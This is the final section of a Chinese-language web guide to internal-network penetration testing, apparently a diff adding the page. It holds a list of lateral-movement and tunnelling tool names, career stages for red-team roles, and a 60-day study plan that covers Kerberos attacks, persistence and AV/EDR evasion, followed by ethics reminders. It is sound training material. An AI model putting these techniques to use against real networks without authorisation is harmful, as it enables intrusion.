+<pre><code class="language-bash">psexec, wmiexec, smbexec, evil-winrm,
+chisel, frp, proxychains
+</code></pre>
+<h3 id="-安全资讯与社区"><a class="header" href="#-安全资讯与社区">📰 安全资讯与社区</a></h3>
+<ul>
+<li><strong>Pentester Blog</strong>: 内网渗透技巧分享</li>
+<li><strong>SpecterOps</strong>: 红队战术研究</li>
+<li><strong>HarmJ0y Blog</strong>: AD安全研究</li>
+<li><strong>Red Team Notes</strong>: 红队笔记</li>
+<li><strong>MITRE ATT&amp;CK</strong>: 攻击战术知识库</li>
+</ul>
+<hr />
+<h2 id="14-职业发展路径"><a class="header" href="#14-职业发展路径">14. 职业发展路径</a></h2>
+<h3 id="初级渗透测试工程师0-2年"><a class="header" href="#初级渗透测试工程师0-2年">初级渗透测试工程师（0-2年）</a></h3>
+<ul>
+<li>掌握基础内网渗透技术</li>
+<li>熟练使用主流渗透工具</li>
+<li>能够完成标准化渗透测试</li>
+<li>编写合格的渗透测试报告</li>
+</ul>
+<h3 id="中级红队工程师2-5年"><a class="header" href="#中级红队工程师2-5年">中级红队工程师（2-5年）</a></h3>
+<ul>
+<li>独立完成复杂内网渗透项目</li>
+<li>能够绕过主流安全防护</li>
+<li>开发自定义攻击工具</li>
+<li>参与APT攻击模拟</li>
+</ul>
+<h3 id="高级红队专家5年以上"><a class="header" href="#高级红队专家5年以上">高级红队专家（5年以上）</a></h3>
+<ul>
+<li>设计复杂红队行动方案</li>
+<li>研究0day漏洞和高级利用技术</li>
+<li>带领团队完成大型演练</li>
+<li>制定企业安全防御策略</li>
+</ul>
+<hr />
+<h2 id="15-60天系统学习计划"><a class="header" href="#15-60天系统学习计划">15. 60天系统学习计划</a></h2>
+<h3 id="第1-2周-基础建设"><a class="header" href="#第1-2周-基础建设">第1-2周: 基础建设</a></h3>
+<ul>
+<li>搭建实验环境（域环境 + 靶机）</li>
+<li>学习网络协议和操作系统原理</li>
+<li>熟悉Nmap、Metasploit基础操作</li>
+<li>完成HackTheBox 3台简单靶机</li>
+</ul>
+<h3 id="第3-4周-信息收集"><a class="header" href="#第3-4周-信息收集">第3-4周: 信息收集</a></h3>
+<ul>
+<li>主机发现和端口扫描技术</li>
+<li>域环境信息收集方法</li>
+<li>BloodHound使用和路径分析</li>
+<li>完成域环境信息收集实验</li>
+</ul>
+<h3 id="第5-6周-漏洞利用"><a class="header" href="#第5-6周-漏洞利用">第5-6周: 漏洞利用</a></h3>
+<ul>
+<li>常见内网服务漏洞利用</li>
+<li>Web应用漏洞到内网突破</li>
+<li>Metasploit模块开发</li>
+<li>完成5个漏洞利用练习</li>
+</ul>
+<h3 id="第7-8周-权限提升"><a class="header" href="#第7-8周-权限提升">第7-8周: 权限提升</a></h3>
+<ul>
+<li>Windows权限提升全技术</li>
+<li>Linux权限提升方法</li>
+<li>自动化提权脚本使用</li>
+<li>完成10个提权靶机</li>
+</ul>
+<h3 id="第9-12周-横向移动与持久化"><a class="header" href="#第9-12周-横向移动与持久化">第9-12周: 横向移动与持久化</a></h3>
+<ul>
+<li>Pass-the-Hash/Ticket攻击</li>
+<li>Kerberos攻击技术</li>
+<li>隧道技术实战</li>
+<li>持久化机制部署</li>
+<li>完成完整攻击链演练</li>
+</ul>
+<h3 id="第13-14周-对抗与免杀"><a class="header" href="#第13-14周-对抗与免杀">第13-14周: 对抗与免杀</a></h3>
+<ul>
+<li>AV/EDR绕过技术</li>
+<li>内存执行和进程注入</li>
+<li>混淆和加密技术</li>
+<li>自定义工具开发</li>
+</ul>
+<h3 id="第15-16周-综合实战"><a class="header" href="#第15-16周-综合实战">第15-16周: 综合实战</a></h3>
+<ul>
+<li>完整红队项目模拟</li>
+<li>编写详细渗透报告</li>
+<li>总结经验和知识梳理</li>
+<li>准备OSCP认证</li>
+</ul>
+<hr />
+<h2 id="-安全提醒"><a class="header" href="#-安全提醒">⚠️ 安全提醒</a></h2>
+<ol>
+<li><strong>法律第一</strong>: 所有技术仅用于授权测试</li>
+<li><strong>保密义务</strong>: 严格保护客户数据和测试结果</li>
+<li><strong>最小影响</strong>: 避免对生产环境造成破坏</li>
+<li><strong>及时沟通</strong>: 发现高危漏洞立即报告</li>
+<li><strong>持续学习</strong>: 攻防技术不断演进，保持学习状态</li>
+</ol>
+<hr />
+<h2 id="-总结"><a class="header" href="#-总结">📝 总结</a></h2>
+<p>内网渗透是信息安全领域的高级技术方向，需要扎实的基础知识和大量的实践经验。本指南提供了系统化的学习路径，但真正的技能提升需要：</p>
+<ol>
+<li><strong>深入理解</strong>: 不仅知道怎么做，更要理解为什么</li>
+<li><strong>大量实践</strong>: 理论必须结合靶场和实战演练</li>
+<li><strong>举一反三</strong>: 从单个技术扩展到完整攻击链</li>
+<li><strong>对抗思维</strong>: 理解蓝队防御，提升红队能力</li>
+<li><strong>道德底线</strong>: 技术是为了安全防御，而非恶意破坏</li>
+</ol>
+<p>记住：优秀的内网渗透工程师不仅是技术专家，更是具有职业道德和法律意识的安全从业者。</p>
+<hr />
+<p><strong>文档版本</strong>: v2.0
+<strong>最后更新</strong>: 2024年1月
+<strong>维护者</strong>: Security Research Team
+<strong>反馈邮箱</strong>: security@example.com (请替换为实际邮箱)</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../编程/security/web渗透.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../编程/security/服务器渗透.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../编程/security/web渗透.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../编程/security/服务器渗透.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../theme/segmentit.umd.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../theme/searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../../theme/pagetoc.js"></script>
+
+
+
+    </div>
+    </body>
+</html>
+
